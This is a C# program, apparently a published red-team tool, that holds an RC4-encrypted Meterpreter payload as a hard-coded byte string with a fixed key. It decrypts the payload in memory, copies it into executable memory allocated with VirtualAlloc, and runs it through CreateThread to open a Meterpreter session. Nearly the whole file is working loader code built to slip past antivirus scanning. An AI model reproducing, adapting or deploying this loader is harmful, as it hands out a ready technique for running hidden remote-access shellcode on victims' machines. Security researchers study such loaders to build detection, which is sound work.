using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace NativePayload_Decryption
{
    class Program
    {
       
        static void Main(string[] args)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("Payload Decryption tool for Meterpreter Payloads ");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Published by Damon Mohammadbagher  2016-2017");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine();
            Console.WriteLine("[!] Using RC4 Decryption for your Payload By KEY.");
            string Payload_Encrypted;

            byte[] xKey = { 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 };
            
            //string[] Input_Keys = args[0].Split(' ');
            //byte[] xKey = new byte[Input_Keys.Length];

            Console.Write("[!] Decryption KEY is : ");
            Console.ForegroundColor = ConsoleColor.Yellow;
            /// Converting String to Byte for KEY by first Argument
            //for (int i = 0; i < Input_Keys.Length; i++)
            //{
            //    xKey[i] = Convert.ToByte(Input_Keys[i], 16);
            //    Console.Write(xKey[i].ToString("x2") + " ");
            //}
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            /// Converting String to Byte for Encrypted Meterpreter Payload by Second Argument         

            //Payload_Encrypted = args[0].ToString();
            Payload_Encrypted = "0 84 37 71 69 109 37 60 21 235 228 108 17 204 176 36 198 93 237 156 145 184 238 1 181 165 137 167 87 222 160 187 124 92 202 24 168 213 233 136 47 91 129 7 14 9 103 63 95 141 211 34 201 140 241 165 213 137 208 219 133 54 49 0 118 140 100 199 158 10 107 116 107 224 90 214 159 208 228 26 231 73 26 151 85 112 83 140 229 51 128 197 75 241 140 169 228 9 68 236 172 198 13 57 86 126 136 198 101 115 100 168 67 172 1 23 246 143 214 151 253 13 113 69 215 169 12 226 190 215 247 224 137 68 123 43 11 12 207 194 2 0 143 251 187 15 171 245 24 105 3 68 10 81 252 63 250 150 219 229 147 55 50 11 237 89 185 220 100 248 20 180 42 175 246 34 27 1 131 203 175 49 104 33 218 144 110 193 189 206 206 204 62 138 78 2 102 75 130 176 183 93 184 252 9 136 155 117 228 39 177 96 169 181 89 233 114 114 29 56 223 163 247 33 145 203 41 151 165 242 162 133 149 123 84 169 156 172 75 103 144 63 254 1 116 121 152 182 15 109 48 242 80 94 76 100 131 28 114 3 119 227 147 76 105 132 185 70 93 236 253 186 193 177 67 202 216 136 241 19 146 16 146 184 10 41 206 30 4 95 176 204 190 95 71 7 146 160 30 113 50 249 159 156 194 14 53 130 12 252 44 159 214 216 139 81 51 145 166 5 194 165 155 160 230 79 185 162 170 103 2 110 95 48 207 207 215 245 167 106 133 70 28 238 114 70 20 7 9 173 132 7 76 226 242 193 123 148 140 199 238 178 109 188 235 52 137 157 233 228 81 21 238 197 38 148 121 77 139 229 155 23 205 66 195 75 35 170 53 81 201 168 212 241 100 156 110 97 185 225 216 106 6 4 171 46 150 154 186 122 208 171 210 33 38 188 129 153 108 126 196 85 178 29 210 128 120 137 73 176 239 6 176 142 238 215 213 176 182 116 152 48 133 217 212 138 97 4 33 165 45 73 54 254 153 125 218 97 156 185 191 100 229 210 112 99 221 159 198 220 211 134 120 15 116 52 150 214 214 8 175 162 109 236 32 48 109 20 106 48 132 102 114 73 23 254 207 38 139 14 109 223 99 164 53 213 52 15 33 211";

            string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(' ');

            byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];

            for (int i = 0; i < Payload_Encrypted_Without_delimiterChar.Length; i++)
            {
                byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());
                _X_to_Bytes[i] = current;
            }
            try
            {
               
                Console.WriteLine();
                Console.WriteLine("[!] Loading Encrypted Meterprter Payload in Memory Done.");
                Console.ForegroundColor = ConsoleColor.Green;

                byte[] Final_Payload = Decrypt(xKey, _X_to_Bytes);
               
                Console.WriteLine("[>] Decrypting Meterprter Payload by KEY in Memory Done.");
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine("Bingo Meterpreter session by Encrypted Payload ;)");

                UInt32 funcAddr = VirtualAlloc(0, (UInt32)Final_Payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Marshal.Copy(Final_Payload, 0, (IntPtr)(funcAddr), Final_Payload.Length);

                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfo = IntPtr.Zero;

                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xffffffff);
            }
            catch (Exception)
            {

                throw;
            }

        }

        /// <summary>
        /// RC4 Decryption Section
        /// </summary>    
        public static byte[] Decrypt(byte[] key, byte[] data)
        {
            return EncryptOutput(key, data).ToArray();
        }
        private static byte[] EncryptInitalize(byte[] key)
        {
            byte[] s = Enumerable.Range(0, 256)
              .Select(i => (byte)i)
              .ToArray();

            for (int i = 0, j = 0; i < 256; i++)
            {
                j = (j + key[i % key.Length] + s[i]) & 255;

                Swap(s, i, j);
            }

            return s;
        }
        private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
        {
            byte[] s = EncryptInitalize(key);

            int i = 0;
            int j = 0;

            return data.Select((b) =>
            {
                i = (i + 1) & 255;
                j = (j + s[i]) & 255;

                Swap(s, i, j);

                return (byte)(b ^ s[(s[i] + s[j]) & 255]);
            });
        }
        private static void Swap(byte[] s, int i, int j)
        {
            byte c = s[i];

            s[i] = s[j];
            s[j] = c;
        }

        
        /// <summary>
        /// Windows API Importing Section
        /// </summary>
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;


        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


    }
}
